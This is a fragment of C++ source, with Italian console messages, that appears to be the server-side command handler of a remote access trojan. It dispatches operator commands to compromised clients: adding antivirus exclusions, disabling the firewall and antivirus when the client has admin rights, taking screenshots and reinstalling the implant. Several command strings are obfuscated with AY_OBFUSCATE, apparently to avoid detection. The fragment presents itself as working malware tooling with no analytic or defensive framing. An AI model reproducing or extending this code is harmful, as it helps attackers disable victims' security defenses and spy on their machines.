                        if (!AddAVexclusion())
                            Controllo = CheckConnection();
                    }
                    else
                        cout << "Il Client non dispone dei privilegi necessari per eseguire l'operazione.\n" << endl;
                }
            }
            else if (cmd == (string)AY_OBFUSCATE("disablefirewall"))
            {
                if (Clients[ID].info.CompatibleVer < 4)
                    UIutils::StampaIncompatibile();
                else
                {
                    if (Clients[ID].info.UAC == "Admin")
                    {
                        if (!DisableFirewall())
                            Controllo = CheckConnection();
                    }
                    else
                        cout << "\nIl Client non dispone di privilegi necessari per eseguire l'operazione." << endl;
                }
            }
            else if (cmd == "screenshot")
            {
                if (Clients[ID].info.CompatibleVer < 5)
                    UIutils::StampaIncompatibile();
                else
                {
                    if (!Screenshot())
                        Controllo = CheckConnection();
                }
            }
            else if (cmd == "reinstall")
            {
                if (Clients[ID].info.CompatibleVer < 5)
                    UIutils::StampaIncompatibile();
                else
                {
                    if (!Reinstall())
                        Controllo = CheckConnection();
                    else
                        Controllo = false;
                }
            }
            else if (cmd == (string)AY_OBFUSCATE("disableav"))
            {
                if (Clients[ID].info.CompatibleVer < 5)
                    UIutils::StampaIncompatibile();
                else
                {
                    if (Clients[ID].info.UAC == "Admin")
                    {
                        if (!DisableAV())
                            Controllo = CheckConnection();
                    }
                    else
                        cout << "\nIl Client non dispone di privilegi necessari per eseguire l'operazione." << endl;
                }
            }
            else
            {
                cout << "\"" << cmd << "\" non e' un comando valido, usa \"help\" per la lista di tutti i comandi." << endl;
            }

            Clients[ID].InTask = false;
        }
    }
};